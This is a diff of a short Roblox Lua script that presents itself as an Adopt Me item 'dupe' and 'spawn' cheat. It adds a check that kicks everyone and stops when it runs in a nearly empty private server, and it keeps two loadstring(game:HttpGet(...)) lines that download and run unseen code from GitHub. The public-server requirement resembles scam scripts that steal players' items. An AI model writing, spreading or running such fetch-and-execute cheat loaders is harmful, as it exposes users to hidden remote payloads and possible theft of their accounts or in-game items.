@@ -1,2 +1,20 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+if not RunService:IsStudio() then
+    local isPrivateServer = game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0
+
+    if isPrivateServer then
+        wait(5)
+
+        if #Players:GetPlayers() <= 2 then
+            for _, player in ipairs(Players:GetPlayers()) do
+                player:Kick("This script only works in public servers with more players.")
+            end
+            return
+        end
+    end
+end
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PlsNoNoob/-/refs/heads/main/Spawn.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Streets341/ADOPT-ME-DUPE-NEW/refs/heads/main/adopt%20me%20dupe", true))()
